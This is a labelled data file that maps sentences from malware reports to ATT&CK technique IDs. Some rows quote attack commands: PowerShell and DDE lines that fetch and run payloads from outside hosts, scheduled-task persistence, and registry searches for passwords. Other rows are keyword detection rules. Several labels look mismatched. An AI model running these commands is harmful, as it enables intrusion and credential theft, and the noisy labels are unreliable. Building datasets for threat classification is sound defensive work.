text1	labels
"While sending to the C2 server, the data is formatted as follows: @{SYSINFO  = $get.ToString(); ACTION = ""REGISTER"";}  Ability to take screenshots"	['T1113']
The “screenshot” command takes a screenshot that is saved as a.PNG file in “ProgramData“	['T1113']
The screen capture below shows the decryption function.It then calls the StartAndPatchRegAsm function.This function tries to find the original Microsoft RegAsm executable path	['T1113']
Figure 3: Screen capture of the downloader executed on OS X El Capitan	['T1113']
Interestingly, we’ve seen recent samples embedding decoy documents that are screenshots of botnet C&C panels or dumps of credit card numbers	['T1113']
POWRUNER will send the captured screenshot image file to the C2 server if the “fileupload” command is issued	['T1113']
The command handle looks for the following command strings in Table 3:    Command Description   $fileDownload Uploads the contents of a specified file to C2   $importModule Adds a specified PowerShell module to the current script   $screenshot Executes the contents of the command, which should be the string ‘$screenshot’	['T1113']
23 Take screenshot, temporarily store it as TPX499.dat, and upload it to the C2	['T1113']
"SpyNote RAT captured the device’s screen activities along with audio using the  MediaProjectionCallback functionality (available with Lollipop, the Android 5.0 release, and later) and saved the output in a file named ""video.mp4"" as shown in the following screenshot:          Figure 5 : Output File     SMS stealing  SpyNote RAT was also observed stealing SMS messages from the affected devices, as shown in screenshot below:          Figure 6: Reading SMS messages     Stealing contacts The ability to steal contacts is a favorite feature for spyware developers, as the stolen contacts can be used to further spread the spyware"	['T1113']
[Screenshot 1] Encrypted Login Packet sent by Gh0stRAT infected PC  In addition to a standard malware analysis blog post, I’d also like to take this time to document and describe my methods for analysis, in the hopes that you as a reader will use these techniques in the future	['T1113']
Returns the screenshot to the C2 via: <img src=’data:image/jpeg;base64,[base64 of screenshot]’ width=800 height=500 /><br>   111 startTakeScreenShot Creates a thread to take a screenshot at a set interval (default: every 10 seconds)	['T1113']
This simply acts as cleanup to ensure original file artifacts no longer reside on the infected machine	['T1070']
This is a guest post by independent security researcher James Quinn. This will be Part 1 of a series titled Reversing Gh0stRAT Variants.  As 2018 drew to a close and 2019 took over, I began to see a different behavior from SMB malware authors.  Instead of massive, multi-staged cryptocurrency miners, I began to see more small, covert RATs serving as partial stage1’s.  Of these samples, there was one specific sample that stood out to me.  A Gh0stRAT variant, this sample not only changed the Gh0stRAT header from “Gh0st” to “nbLGX”, it also hid its traffic with an encryption algorithm over the entire TCP segment, in addition to the standard Zlib compression on the Gh0stRAT data.  Some key functionality is below:   Can download more malware   Offline Keylogger   Cleans Event logs	['T1070']
The same situation applies to authentication by key pair – the server contains a pre-defined constant public key and it allows authentication only if a particular private key is used	['T1056']
The keylogger then records keystrokes in encrypted files, for example: thumbcache_96.dbx	['T1056']
NetWire has a built-in keylogger that can capture inputs from peripheral devices such as USB card readers	['T1056']
It is commonly sold on various hacking forums as a keylogger and stealer that can be used to monitor systems and exfiltrate information from those systems	['T1056']
Deobfuscated, we can see it is the HawkEye Keylogger — Reborn v9, Version=9.0.1.6	['T1056']
8 Upload the TPX498.dat file, which contains the list of collected keystrokes	['T1056']
63 64 ku64.dll ku32.dll Keylogger & clipboard monitor	['T1056']
keylogger) may be missing for these platforms	['T1056']
However, the campaign that the PDC has recently observed has been delivering this keylogger exclusively	['T1056']
There does appear to be function names however, including PeekMessageA, which has been previously observed in other keylogging malware	['T1056']
Keylogging Functionality XAgent also has a keylogger functionality that allows the threat actors to steal credentials as the user types them	['T1056']
This callback function will call a function named pressedKeyWithKeyCode, which is responsible for logging the keystrokes	['T1056']
Figure 1 Side-by-side of the lure images within ThreeDollars in the October 2017 and the January 2018 attacks   Superficially, we can immediately see the images are quite similar, but with some glaring differences	['T1574.002']
The technique of having a signed, legitimate, executable load a malicious library is commonly referred to as side-loading, and has been witnessed in a number of campaigns and malware families in the past	['T1574.002']
DLL side loading is often used to maintain persistence on the compromised system	['T1574.002']
Note: DLL side loading is a prevalent persistence technique that is used to launch a multitude of backdoors	['T1574.002']
Send exfiltrated data   taskkill.exe Ends working cycle of modules    Persistence Persistence modules are based on scheduled tasks and system registry	['T1053', 'T1053.005']
"For newer operating systems, events.exe creates task.xml as follows:  Then it creates a Windows scheduled task using the following command:       schtasks.exe /create /TN \""Events\\CacheTask_<user_name_here>"" /XML \""<event_cache_dir_path>t /F""     At the system registry level, modules achieve persistence by adding themselves into the key: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit when it finds possible add values to the Winlogon subkey, and in HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft Activity Manager"	['T1053', 'T1053.005']
In addition, the PowerShell implant did not contain a mechanism to persist beyond a simple scheduled task	['T1053', 'T1053.005']
After execution of every task, the malware sleeps for one minute before executing the next task	['T1053', 'T1053.005']
The main similarities include the use of a scheduled task to persistently execute on the system, as well as the same general process to communicate with its C2 server	['T1053', 'T1053.005']
The decoded string from the Sch resource is: SchTasks /Create /SC MINUTE /MO 3 /TN “%n%” /TR “wscript %path%” /f The decoded string from the VBS resource is: CreateObject(“WScript.Shell”).Run(“%app%”) The %n% string in the schtasks command above will be replaced with the GUID saved to GDI.bin	['T1053', 'T1053.005']
This differs from the previous OopsIE variant that used a hardcoded task name for the scheduled task	['T1053', 'T1053.005']
After creating this scheduled task for persistence, the Trojan will begin communicating with its C2 server	['T1053', 'T1053.005']
A scheduled task is also generated to maintain persistence of the payload	['T1053', 'T1053.005']
Office365DCOMCheck or SystemDiskClean) as the name for the scheduled task to maintain persistence on the victim host	['T1053', 'T1053.005']
"The malware component, test.exe, uses the Windows command ""cmd.exe"" /C whoami” to verify it is running with the elevated privileges of “System” and creates persistence by creating the following scheduled task:     schtasks /create /tn ""mysc"" /tr C:\Users\Public\test.exe /sc ONLOGON     /ru ""System"" When executed, the malware first establishes a SOCKS5 connection to 192.157.198.103 using TCP port 1913"	['T1053', 'T1053.005']
This DLL is used to create a scheduled task that points to the QuasarRAT binary, microsoft_network.exe, allowing it to remain persistent after reboot	['T1053', 'T1053.005']
They use At.exe to schedule tasks to run self-extracting RAR archives, which install either HttpBrowser or PlugX	['T1053', 'T1053.005']
Another batch script run by a scheduled task renames the archives on the file server (see Figure 15)	['T1053', 'T1053.005']
The scripts create scheduled tasks and also retrieve, decode, and execute a copy of Revenge RAT	['T1053', 'T1053.005']
"The spreadsheet also creates a scheduled task named ""windows update check"" that runs the file C:\Users\<user_name>\.templates\System Manager.exe every minute."	['T1053', 'T1053.005']
When the trojan starts up it will attempt to install a scheduled task with the name of “Java Maintenance64” to keep itself running.	['T1053', 'T1053.005']
The campaigns maintain persistence on machines by creating two daily scheduled task entries.	['T1053', 'T1053.005']
The script writes files to the path % appdata %\Roaming\Microsoft\Templates\, then creates two task entries triggered to run daily.	['T1053', 'T1053.005']
On occasions, the phishing emails contained links to external domains to download the first stage, and sometimes the first stage was attached to the email itself	['T1598.003']
These emails included recruitment themed lures and contained links to malicious HTML application (.hta) files	['T1598.003']
"The first link was labeled as ""Comparison of Major Tasks in '16 & '17"" and the second link was identified as ""Comparison between '16 & '17"".Upon opening these links the user was presented with a further decoy Hangul document"	['T1598.003']
It is highly likely the adversary then used spear-phishing attacks containing links to these malicious documents as a delivery mechanism	['T1598.003']
email with an embedded tracking link	['T1598.003']
A total of 64MB of garbage data is appended to this copied file, likely as a way to deter any security products in place that may be scanning files on disk	['T1027.001']
Using this example, Comnie will then request data to supply to the BAT script, via the following decrypted request: h=HOSTNAME-PC&f=gethostinfo.bat&c=& Based on network traffic witnessed, the remote C2 server was found to respond with the following information:       netstat -ano > %TEMP%\info.datipconfig /all >> %TEMP%\info.datroute PRINT >> %TEMP%\info.datnet view >> %TEMP%\info.dattasklist >> %TEMP%\info.datnet user >> %TEMP%\info.datnet start >> %TEMP%\info.dat       This script is written to a temporary file prior to be executed	['T1007']
The final part of the VBA script changes the properties of these two files, setting their attributes to Hidden	['T1564.001']
The locations:  For root user  path: /Library/CoreMediaIO/Plug-Ins/FCP-DAL/iOSScreenCapture.plugin/Contents/Resources/ processname: screenassistantd  For regular user  path: ~/Library/Spelling/ processname: spellagentd Subsequently, it implements the Loader::installLoader method, reading the hardcoded 64-bit Mach-O executable (magic value 0xFEEDFACF), and writing to the previously determined path and file	['T1564.001']
This field contains a URL that the Trojan will use to upload the contents of the <process ID of Trojan>.txt file, which will be structured as <process ID of Trojan>.<C2 domain> where the process ID is encoded with the same character substitution function as seen previously in Table 4	['T1057']
The most notable change to this variant of Zebrocy, other than the programming language used, is the way the tool gathers the system information and running processes	['T1057']
Gather domain and account names based on all running processes  Gathering account information from running processes	['T1057']
Figure 2: Process chain for the first part of the campaign Although the actual VBS script changed from sample to sample, with different levels of obfuscation and different ways of invoking the next stage of process tree, its final purpose remained same: invoking PowerShell to decode the Base64 encoded PowerShell command in the INI file that was dropped earlier by the macro, and executing it	['T1057']
It searches the active process list for the systemd process	['T1057']
Next, it checks the running processes against a list of hard-coded process names; if any are found, the machine is forcefully rebooted	['T1057']
This directory will also contain the process id of the running malware in process.id and a “build name” (as it is called by the author) in build.id	['T1057']
Enumerates running processes for “Wireshark” and “Sysinternals”	['T1057']
What does the Poseidon Group do? What happens after a target machine is infected? Once the target’s machine is compromised, the attacker first enumerates all processes running in the system and all services	['T1057']
78 runin.bin List of processes names and associated plugins should be run inside these processes	['T1057']
The command does not attempt to kill the specific Office process that would load the particular delivery document, such as Excel in the case of this “.xlam” file, but instead attempts to kill processes associated with Word, Excel, PowerPoint and Publisher	['T1057']
While it includes multiple ways to find Explorer, the preferred method is to get the process id from the current desktop window.	['T1057']
As part of the anti-debugging or anti-monitoring techniques, ShellTea iterates over all the running processes, applies CRC32 on each process name (after converting the string to capital letters), and then compares the value against a predefined set of CRCs.	['T1057']
lists the running processes	['T1057']
The Trojan will then use the following regular expression to check the HTTP response to the content upload request for the file identifier value: \”id\”:(.*) The Trojan will use this file identifier value to monitor for changes made to the file by the actor by checking for changes to the modification time of the <process ID of Trojan>.txt file	['T1070.006']
The Trojan uses the access token to write the string above to the first file uploaded to Google drive whose filename is <process ID of Trojan>.txt	['T1134']
"The tokens for each platform are hardcoded within the sample:November 2016 to January 2017: ""Evil New Year"" CampaignIn the early part of 2017, Group123 started the ""Evil New Year"" campaign"	['T1134']
Figure 6 Relational diagram of artifacts  We created a timeline of the activity based off the data we collected, and found that the attack dates were tightly clustered into two waves in mid- to late-October and in mid-November as we see in Figure 7 using the timestamps from Table 3	['T1562.001']
Ability to disable Microsoft Office Protected View (as shown in Figure 15) by setting the following keys in the Windows Registry: DisableAttachmentsInPV DisableInternetFilesInPV DisableUnsafeLocationsInPV       Figure 15: Disabling Microsoft Office Protected View  Ability to remotely reboot or shut down or clean the system based on the command received from the C2 server, as shown in Figure 16	['T1562.001']
From an infrastructure point of view there is no overlap between the two sets of activity, the only overlap is the use of the unique tool “DNSMessenger”  When these points are considered together in conjunction with the significant difference in targeting they make a strong case for classifying this activity as distinct from FIN7 activity	['T1562.001']
SHA256 Compiled C2 account POP3S Account SMTPS Accounts   861b6bc1f9.	['T1087']
Restricting these privileges may prevent malware from running or limit its capability to spread through the network.Carefully consider the risks before granting administrative rights to users on their own machines.Scrub and verify all administrator accounts regularly.Configure Group Policy to restrict all users to only one login session, where possible.Enforce secure network authentication, where possible.Instruct administrators to use non-privileged accounts for standard functions such as web browsing or checking webmail.Segment networks into logical enclaves and restrict host-to-host communication paths	['T1087']
This may include information about the currently logged in user, the hostname, network configuration data, active connections, process information, local and domain administrator accounts, an enumeration of user directories, and other data	['T1087']
With these outputs, FIN6 was able to identify user accounts that could access additional hosts in the domain	['T1087']
The PowerShell script collects all possible information on the user and the network, including snapshots, computer and user names, emails from registry, tasks in task scheduler, system information, AVs registered in the system, privileges, domain and workgroup information	['T1087']
Its use of a PowerShell payload means that only legitimate system processes are utilized and that the malicious code execution can only be identified through enhanced logging or in memory	['T1546.013', 'T1059.001']
Mandiant initially identified an early variant of the POSHSPY backdoor deployed as PowerShell scripts during an incident response engagement in 2015	['T1546.013', 'T1059.001']
Figure 2: WindowsParentalControlsMigration CommandLineTemplate Figure 3 contains the decoded PowerShell command from the “CommandLineTemplate.”      Figure 3: Decoded CommandLineTemplate PowerShell code POSHSPY PowerShell Component The full code for a POSHSPY sample is available here	['T1546.013', 'T1059.001']
Additional Reading This PowerShell logging blog post contains more information on improving PowerShell visibility in your environment	['T1546.013', 'T1059.001']
However, in this new variant, all the DNS activity is initiated and executed solely from memory – unlike previous attacks which used PowerShell commands	['T1546.013', 'T1059.001']
The PowerShell script executes a compressed first stage PowerShell child process, which then performs a second stage PowerShell process	['T1546.013', 'T1059.001']
The PowerShell implant used in the Olympics campaign was a stager based on the PowerShell Empire framework that created an encrypted channel to the attacker’s server	['T1546.013', 'T1059.001']
(For more on steganography, see the McAfee Labs Threats Report, June 2017, page 33.) The implants covered in this research establish a permanent presence on the victim’s system once the PowerShell implant is executed	['T1546.013', 'T1059.001']
The main function performed by the SCT file is to Base64 decode the contents of WindowsDefender.ini file and execute the decoded PowerShell Script using the following command line: powershell.exe -exec Bypass -c iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((get-content C:\\ProgramData\\WindowsDefender.ini) The rest of the malicious activities are performed by the PowerShell Script	['T1546.013', 'T1059.001']
PowerShell File Analysis The PowerShell script employs several layers of obfuscation to hide its actual functionality	['T1546.013', 'T1059.001']
Figure 11: PowerShell script is XOR encoded using a single byte key After deobfuscating the contents of the PowerShell Script, we can divide it into three sections	['T1546.013', 'T1059.001']
The malicious macros were all designed to use Windows PowerShell to download a shellcode-based payload from a remote server	['T1546.013', 'T1059.001']
The macro uses PowerShell to download a shellcode-based payload from a remote server using one of two available techniques	['T1546.013', 'T1059.001']
On January 1, 2017, we observed this URL responding to the above HTTP request with the following data:powershell.exe -exec bypass -window hidden -noni -nop -encoded JABjAG8AbQBtAGEAbgBkACAAPQAgACcAVwB3AEIATwBBAEcAVQBBAGQAQQBBAHUAQQBGAE0AQQBaAFEAQgB5AEEASABZAEEAYQBRAEIAagBBAEcAVQBBAFUAQQBCAHYAQQBHAGsAQQBiAGcAQgAwAEEARQAwAEEAWQBRAEIAdQBBAEcARQBBAFoAdwBCAGwAQQBIAEkAQQBYAFEAQQA2AEEARABvAEEAVQB3AEIAbABBAEgASQBBAGQAZwBCAGwAQQBIAEkAQQBRAHcAQgBsAEEASABJAEEAZABBAEIAcABBAEcAWQBBAGEAUQBCAGoAQQBHAEUAQQBkAEEAQgBsAEEARgBZAEEAWQBRAEIAcwBBAEcAawBBAFoAQQBCAGgAQQBIAF..snip..As you can see, the C2 server responds with a PowerShell command that will run on the system	['T1546.013', 'T1059.001']
Upon execution in a vulnerable environment, the PowerShell based payload takes over	['T1546.013', 'T1059.001']
The PowerShell script is responsible for downloading the final payload from C2 server to execute it	['T1546.013', 'T1059.001']
Use of the non-public PowerShell backdoor previously described by Morphisec and MalwareBytes (which we refer to as POWERSTATS)	['T1546.013', 'T1059.001']
Attacker deception and attribution The deobfuscated PowerShell code used by the MuddyWater group resembles previously seen PowerShell scripts that most likely served as prototypes	['T1546.013', 'T1059.001']
Lock PowerShell Execution Policy, must be set to “AllSigned” via GPO	['T1546.013', 'T1059.001']
These PowerShell scripts are final stage payloads – they include a downloader with domain generation algorithm (DGA) functionality and the backdoor component, which connect to the C2 server to receive commands and perform additional malicious activities.  hUpdateCheckers.ps1 (POWRUNER) The backdoor component, POWRUNER, is a PowerShell script that sends and receives commands to and from the C2 server	['T1546.013', 'T1059.001']
The contents within the releasenotes.txt file (SHA256: bf925f340920111b385078f3785f486fff1096fd0847b993892ff1ee3580fa9d)  contains the following formula that Excel will save to the “A0” cell in the worksheet:  The formula uses a command prompt to run a PowerShell script that attempts to download and execute a second PowerShell script hosted at the URL hxxp://micrrosoft[.]net/winupdate.ps1	['T1546.013', 'T1059.001']
The decompressed PowerShell payload has some similarities to the PowerShell Empire agent, such as the use of a jitter value and commands referred to by job ID, but we do not have conclusive evidence that the author of this tool used Empire as a basis for their tool	['T1546.013', 'T1059.001']
"It will run the newly downloaded PowerShell script by running the following command via cmd /c:       wscript.exe ""Office365DCOMCheck.vbs"" ""PowerShell.exe-ExecutionPolicy bypass -WindowStyle hidden -NoProfile <path to Office365DCOMCheck.ps1 script>""     The payload will then notify the C2 it has successfully downloaded and executed the secondary PowerShell payload"	['T1546.013', 'T1059.001']
The Information Gathering Tool (IGT) tool is coded in Delphi and includes powershell and SQL components across a dozen different drops	['T1546.013', 'T1059.001']
The following shows this unused command, which exposed an additional server within Sofacy’s infrastructure would download and execute an encoded PowerShell script from 92.114.92[.]102:       C:\\Programs\\Microsoft\\MSOffice\\Word.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -Whidden $e=(New-ObjectSystem.Net.webClient).downloadString('hxxp://92.114.92[.]102:80/d');powershell -enc $e #     The unused command above appears to be related to previous attacks, specifically attacks that occurred in November 2017 as discussed by McAfee and ESET	['T1546.013', 'T1059.001']
Then, it will launch Dec.exe using PowerShell with the command “ cmd.exe /c powershell - WindowStyle Hidden Start-Process Dec.exe - WindowStyle maximized ”.	['T1546.013', 'T1059.001']
The attacker made use of Cobalt Strike’s “psexec” lateral movement command to create a Windows service named with a random 16-character string on the target system and execute encoded PowerShell	['T1546.013', 'T1059.001']
Next, the script triggered a PowerShell stager	['T1546.013', 'T1059.001']
Following successful infiltration, the malware persists through registry: HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run The command line execution leads to PowerShell code executed from a different registry value .	['T1546.013', 'T1059.001']
PowerShell scripts that perform system reconnaissance and credential theft from Windows Credential Manager and then send this information back to Waterbug C& Cs.	['T1546.013', 'T1059.001']
The script is used to decode and execute the following payloads:Appach01.jpg (renamed: Windows-KB275122-x86.exe) is a Freenki sample.Appach01.jpg (renamed: Windows-KB271854-x86.exe) is a PoohMilk sample.PoohMilk AnalysisThe PoohMilk sample is designed to perform two actions:Create persistence to execute the Freenki sample at the next reboot.Check specific files on the infected machine.The first action is to create a registry key in order to execute the Windows-KB275122-x86.exe file previously downloaded	['T1106']
Additionally we see a cmd.exe process launched and used for process injection using the VirtualAlloc(), WriteProcessMemory() and CreateRemoteThread() Windows APIs, as with the first finding of ROKRAT they continue to use similar Windows APIs	['T1055.012']
It hands over the decrypted buffer extracted from the resource section and the path from the original RegAsm executable to the start_protect_hexcode function.Then it starts the process-hollowing shellcode, which is stored in the HEXCODE1 variable	['T1055.012']
Then, they are using the process hollowing technique to hide the execution of these tools inside of the original Microsoft vbc.exe (VisualBasic Compiler) process	['T1055.012']
"Figure 6 Example of delivery document The RTF document (8cf3bc2bf…) was very small in size at 264 bytes, which can be seen in its entirety here:       {\rtf1{\field{\*\fldinst DDEAUTO ""C:\\\\WIndowS\\\\SYsTem32\\\\cMD.eXe "" ""/C	POWErsHELl.eXE  -ex     BypaSs  -NOP	-w      HIdDen  (NEw-oBjeCT SyStEm.NET.weBCLiENT).dowNloADFILe( 'hxxp://86.106.131[.]177/link/GRAPH.EXE'  ,       '%apPDAtA%\graph.exe'   )   ;       saps    '%Appdata%\graph.exe'""}}}     The contents above use the DDE functionality in Microsoft Word to run a PowerShell script to download the Koadic payload from a remote server, save it as an executable file on the system and then execute the payload"	['T1055.012']
"Figure 1 Article referenced by decoy document in attack against British government agency   The attached document leverages a DDE exploit to ultimately execute the following code:c:\\windows\\system32\\cmd.exe ""/k PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -noprofile -command (New-Object System.Net.WebClient).DownloadFile('https://881.000webhostapp[.]com/0_31.doc', '%TEMP%\\AAA.exe');Start-Process('%TEMP%\\AAA.exe')Palo Alto Networks first witnessed this DDE exploit technique in May 2017, and attackers continue to leverage it"	['T1055.012']
Upon execution, this Trojan checks to see if it was configured with “BINDERON” to determine if it should extract an embedded payload from a resource named “B”, save it to %TEMP%\%BIND1%, and create a new process with the embedded payload	['T1055.012']
Figure 15: Structure used to send data to server    Figure 16: Structure used to send data to C2 server The structure is converted to Base64 using the CryptBinaryToStringA function	['T1048']
It then uses WebDAV to upload to a Box cloud drive.	['T1048']
Much like the previous version of Reaver, Reaver.v3 will query the necessary registry keys to determine the correct startup path to use	['T1012']
An example of this decompressed configuration may be seen below:  Figure 2 Decompressed Reaver configuration This configuration contains multiple pieces of information, including the following:  Network port Sleep timer between network requests Remote Command and Control (C2) Service Name Service Description Service Display Name Hardcoded String	['T1569.002']
Much like the original payload, this tool uses if/else statements to skip the legitimate code in the Saransh Email System source to run the malicious functions, which have the same method names as the original tool and follow the same call sequence:  Form1.Speed Form1.diomadnfagaghagh Form1.fjcsERIfjfiojsGHIsdifjksi Form1.gsgjIDJIGJIGJIGJIFDOSpl Form1.FJaioefgkaoeK  This chain of functions eventually loads a resource named ‘GSrdofjksrgj’, which the tool decrypts using the same algorithm and key as in the initial payload:byte[] array4 = new byte[] {     19,     129,     43,     37,     56,     65,     255,     75,     111,     19,     211,     120,     0,     49,     126,     248 };The decrypted payload has a SHA256 hash of 5e805a88294f6d25d55103d19d13e798e01ad70e6b89e9c58db5d468cc63b3d5, which is a variant of the NanoCore remote administration tool	['T1569.002']
The files we recovered indicate they do it by executing a script file, which uses the Sysinternals  psexec tool to move laterally by trying to copy it to every machine they can reach:	['T1569.002']
The following capabilities have been observed in this payload:  Get drive information Modify files Modify directories Modify registry Spawn process Terminate process Modify services Kill self   Ties to SunOrcal Reaver was used concurrently with SunOrcal over the past year, to include two Reaver samples dropped from zip files hosted on a domain also being used as a SunOrcal C2 (www.fyoutside[.]com), and there is also passive DNS overlap amongst the C2s	['T1112']
The backdoor will modify the registry for the Windows Media Player to store its C&C configuration.	['T1112']
Hard Disk Check The Trojan will perform the following WMI query:   Select * from Win32_DiskDrive   The Trojan will check the Caption and Model fields in the results for the strings Virtual, VMWare, VM, VBox or Oracle	['T1497.001', 'T1497']
Motherboard Check The Trojan will perform the following WMI query:   Select * from Win32_BaseBoard   The Trojan will check the Manufacturer and Product fields in the results for the strings VMware, Virtual, VBox, VM or Oracle	['T1497.001', 'T1497']
ShellTea utilizes a number of techniques to identify if it is running within a virtual environment or is being monitored.	['T1497.001', 'T1497']
High resolution screenshots of specified process windows and when recording VoiceIP application audio	['T1123']
To ensure its victim will use IE, it will terminate any process in-focus that is Chrome or Firefox, in hopes the victim will believe the browsers are “malfunctioning.” Whenever a victim uses IE and browses to specific Brazilian banks or businesses, the malware will only then begin to log keystrokes	['T1552.001']
The usage of LinkedIn to deliver malicious documents,	['T1566.003']
At the same time, Enc.exe will start the encryption routine and append “. jcry ” as file extension to the encrypted file.	['T1486']
Opening document starts a template injection technique for loading the document template from the internet.	['T1221']
The Data field is encrypted using a custom stream cipher.	['T1486']
Finally the script deletes the shadow copies, in a preparation for the ransomware operations.	['T1490']
They apparently create a Domain Admin account  named SQLSVC and give it the password Br4pbr4p (which also happens to be the password salt preconfigured in the dirtycow exploit script) and then leverage that account to perform a series of commands.	['T1136']
smb and exploit in same sentence	['T1210']
The decoy file, doc.rtf, contains an OLE object that uses Equation Editor to drop the embedded shellcode in %TEMP%	['T1559.002']
The decrypted shellcode is dropped as a Microsoft Word plugin WLL  into C:\Users\ADMINI~1\AppData\Roaming\Microsoft\Word\STARTUP.	['T1137']
The wormDll32 module attempts to identify servers and domain controllers in the network using NetServerEnum and LDAP queries.	['T1482']
This module searches the infected system’s files to gather email addresses for information-stealing purposes.	['T1114']
A USB data collecting tool that checks for a connected USB drive and steals certain file types, encrypting them into a RAR file.	['T1025']
overwrite or delete MBR in same sentence	['T1561.002']
master boot record wiper	['T1561.002']
MBR + overwrite/wipe	['T1561.002']
reg query HKLM /f password /t REG_SZ /s	['T1552.002']
reg query HKCU /f password /t REG_SZ /s	['T1552.002']
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager	['T1546.009']
COM and execution in same sentence	['T1021.003']
C:\Windows\System32\sethc.exe	['T1546.008']
collect + keychain in same sentence	['T1555.001']
looks for net and account or domain in close proximity	['T1201']
!ProcessList List running processes, including their PID, parent PID, executable name and priority   !SendFileToServer Uploads a specified file to the C2 server   !CaptureScreen Takes a screenshot that it saves to a file and uploads to the C2 server	['T1057', 'T1105']
(Source: Dell SecureWorks) Appendix C — OwaAuth web shell analysis OwaAuth is a web shell that is installed as an ISAPI filter on Exchange servers and shares characteristics with the ChinaChopper web shell	['T1059', 'T1505.003']
(Source: Dell SecureWorks)  ChinaChopper web shell — A web-based executable script (see Figure 4) that allows a threat actor to execute commands on the compromised system	['T1059', 'T1505.003']
(Source: Dell SecureWorks) Table 4 lists the OwaAuth web shell commands available to the adversary	['T1059', 'T1505.003']
(Source: Dell SecureWorks)   The following tools appear to be exclusive to TG-3390:  OwaAuth web shell — A web shell and credential stealer deployed to Microsoft Exchange servers	['T1059', 'T1505.003']
(Source: SecureWorks)  NetWire logs keystrokes and peripheral inputs into encoded files in the C:\Users\<username>   Figure 3	['T1033', 'T1056']
(Source: SecureWorks)  The “Windows Folder.exe” executable spawns and injects code into the legitimate notepad.exe Windows process (see Figure 2)	['T1055.012', 'T1055']
0x007CFABF  video  Desktop video recording    0x06E533C4  download  Downloads executable and injects into new process    0x00684509  ammyy  Ammyy Admin tool    0x07C6A8A5  update  Updates self    0x0B22A5A7     Add/Update klgconfig (analysis incomplete)    0x0B77F949  httpproxy  Starts HTTP proxy    0x07203363  killos  Renders computer unbootable by wiping the MBR    0x078B9664  reboot  Reboots the operating system    0x07BC54BC  tunnel  Creates a network tunnel    0x07B40571  adminka  Adds new C2 server or proxy address for pseudo-HTTP protocol    0x079C9CC2  server  Adds new C2 server for custom binary protocol    0x0007C9C2  user  Creates or deletes Windows user account    0x000078B0  rdp  Enables concurrent RDP (analysis incomplete)    0x079BAC85  secure  Adds Notification Package (analysis incomplete)    0x00006ABC  del  Deletes file or service    0x0A89AF94  startcmd  Adds command to the configuration file (see the Configuration section)    0x079C53BD  runmem  Downloads executable and injects directly into new process    0x0F4C3903  logonpasswords  Send Windows accounts details to the C2 server    0x0BC205E4  screenshot  Takes a screenshot of the desktop and sends it to the C2 server    0x007A2BC0  sleep  Backdoor sleeps until specified date    0x0006BC6C  dupl  Unknown    0x04ACAFC3     Upload files to the C2 server    0x00007D43  vnc  Runs VNC plugin    0x09C4D055  runfile  Runs specified executable file    0x02032914  killbot  Uninstalls backdoor    0x08069613  listprocess  Returns list of running processes to the C2 server    0x073BE023  plugins  Change C2 protocol used by plugins    0x0B0603B4     Download and execute shellcode from specified address    0x0B079F93  killprocess  Terminates the first process found specified by name    0x00006A34  cmd  Initiates a reverse shell to the C2 server    0x09C573C7  runplug  Plugin control    0x08CB69DE  autorun  Updates backdoor    Table 2: Supported Commands Configuration A configuration file resides in a file under the backdoor’s installation directory with the .bin extension	['T1041', 'T1105', 'T1008']
13 14 ams_api64.dll ams_api32.dll Handy wrapper around API of exXX.dll, pdXX.dll, sgXX.dll	['T1055', 'T1574.001', 'T1574.002']
2.     The macro decodes the dropped files using Windows certutil.exe (certutil.exe is a legitimate built-in command-line program to manage certificates in Windows).    3.     The macro creates a copy of the files with their proper extensions using Extensible Storage Engine Utilities (esentutil.exe) (esentutil.exe is also a legitimate program that is pre-installed in Windows). The dropped files include the following:  GUP.exe : GUP, a free (LGPL) Generic Updater. GUP is an open source binary used by Notepad++ for software updates	['T1055.012', 'T1106', 'T1036', 'T1010']
22 Keylogging and exfiltrating data The exfiltrated data is base64 that decodes into more custom encoded strings that appear to be “/” delimited	['T1140', 'T1560']
37 38 zlib64.dll zlib32.dll Open source “zlib” version 1.2.3 used by libpngXX.dll for compressing screenshots (ssXX.dll)	['T1055', 'T1574.002']
59 60 61 62 freeimage_32.dll freeimageplus_32.dll freeimage_64.dll freeimageplus_64.dll FreeImage open source library supports popular graphics image formats (ver 3.15.4 2012-10-27) (http://freeimage.sourceforge.net)	['T1055', 'T1574.001']
